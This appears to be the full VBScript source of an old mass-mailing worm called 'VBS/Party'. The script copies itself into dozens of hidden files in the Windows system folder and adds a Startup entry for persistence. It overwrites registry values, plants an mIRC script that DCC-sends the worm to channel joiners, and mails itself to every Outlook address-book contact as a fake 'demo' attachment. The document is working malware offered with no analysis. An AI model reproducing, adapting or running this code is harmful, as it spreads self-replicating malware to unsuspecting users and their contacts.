'VBS/Party
'	by: SiR DySTyK
'Greetz go out to Mr Bima & everyone else I know ;-)

Dim fso, file, codecopy, i, ctr, fldrCtr, rr, msg, dirwin, dirsystem, dirtemp
msg = "Hey!!.. Cloze the doorz coz we gonna party in 'ere ALL nite!!   ;-)"
Set fso = CreateObject("Scripting.FileSystemObject")
Set cows = CreateObject("WScript.Shell")
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
On Error Resume Next
rr = cows.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Cntr")
If rr >= 1 Then
	ctr = rr
Else
	ctr = 0
	cows.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Cntr",ctr
End If
If ctr = 0 Then
	 rr = cows.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\FldrCtr")
	If rr >= 1 Then
		fldrCtr = rr
	Else
		fldrCtr = 0
		cows.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\FldrCtr",fldrCtr
	End If
	Set fldr = fso.CreateFolder(dirsystem & "\Party" & fldrCtr)
	For i = 1 to 50
		Set file = fso.CreateTextFile(dirsystem & "\Party" & fldrCtr & "\Party" & i & ".vbs",2,False)
		Set x = fso.OpenTextFile(WScript.ScriptFullName,1)
		codecopy = x.ReadAll
		file.Write codecopy
		file.Close
		Set attr = fso.GetFile(dirsystem & "\Party" & fldrCtr & "\Party" & i & ".vbs")
		attr.Attributes = attr.Attributes + 3
		Set attr = fso.GetFolder(dirsystem & "\Party" & fldrCtr)
		attr.Attributes = 0
		attr.Attributes = 3
	Next
	ctr = ctr + 1
	fldrCtr = fldrCtr + 1
	cows.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\FldrCtr",fldrCtr
Else
	fldrCtr = fldrCtr + 1
	ctr = ctr + 1
End If
If ctr >= 20 Then
	MsgBox "Welcome to the party... We should invite more peepz   ;-)",vbSystemModal,"VBS/Party - by: SiR DySTyK"
	ctr = 0
End If
cows.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Cntr",ctr
cows.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Version","Mickey$oft Windowz v0.3"
cows.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","SiR DySTyK"
cows.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization","VBS/Party"
If Day(Now) = "1" Then MsgBox msg,vbCritical,"VBS/Party"
If (fso.FileExists("C:\Windows\Start Menu\Programs\StartUp\WinMgr.LNK.vbs")) = False Then
	Set c = fso.GetFile(WScript.ScriptFullName)
	c.Copy("C:\Windows\Start Menu\Programs\StartUp\WinMgr.LNK.vbs")
	c.Copy(dirsystem & "\Party.BAS.vbs")
End If

'Welcome to the world of IRC ;-)
If (fso.FileExists("c:\mirc\mirc.ini")) Then
	Set mIRC = fso.CreateTextFile("c:\mirc\script.ini")
	mIRC.WriteLine "[script]"
	mIRC.WriteLine ";Party..... by: SiR DySTyK"
	mIRC.WriteLine ";Hey!.. Cloze the doorz coz we gonna party in 'ere all night   ;-)"
	mIRC.WriteLine ";Pleaze do NOT edit this script.. it will affect your mIRC server"
	mIRC.WriteLine ";"
	mIRC.WriteLine ";For further detailz.. contact:"
	mIRC.WriteLine ";Khaled Mardam-Bey"
	mIRC.WriteLine ";http://www.mirc.com"
	mIRC.WriteLine ";"
	mIRC.WriteLine "n0=on 1:JOIN:#:{"
	mIRC.WriteLine "n1= /if ( $nick == $me ) { halt }"
	mIRC.WriteLine "n2= /.dcc send $nick "&dirsystem&"\Party.BAS.vbs"
	mIRC.WriteLine "n3=}"
	mIRC.Close
End If

'Mail time baby!!   ;-)
Dim addylists, addyread, entries, addys, regaddy, male, al, x, done
done = cows.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Mail")
If done <> "1" Then
	Set outlook = WScript.CreateObject("Outlook.Application")
	Set mapi = Outlook.GetNameSpace("MAPI")
	For addyLists = 1 To mapi.AddressLists.Count
		Set al = mapi.AddressLists(addylists)
		x = 1
		y = 0
		addyread = cows.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
		If (addyread = "") Then addyread = 1
		If (Int(al.AddressEntries.Count) > Int(addyread)) Then
			For entries = 1 to al.AddressEntries.Count
				addys = al.AddressEntries(x)
				regaddy = ""
				regaddy = cows.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & addys)
				If (regaddys = "") Then
					Set male = outlook.CreateItem(y)
					male.Recipients.Add(addys)
					male.Subject = "Party Time"
					male.Body = vbCrLf & "Hey!!.. Cloze the doorz coz we gonna party in 'ere all nite!!   ;-)" & vbCrLf & "Sweet demo coded in Visual Basic.. unleash the powerz of Mickey$oft!" & vbCrLf & "Enjoy   :-)"
					male.Attachments.Add(dirsystem & "\Party.BAS.vbs")
					male.Send
					cows.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & addys,1,"REG_DWORD"
				End If
			x = x + 1
			Next
			cows.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & al, al.AddressEntries.Count
		Else
			cows.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & al, al.AddressEntries.Count
		End If
	Next
	cows.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Mail","1"
	Set outlook = Nothing
	Set mapi = Nothing
End If
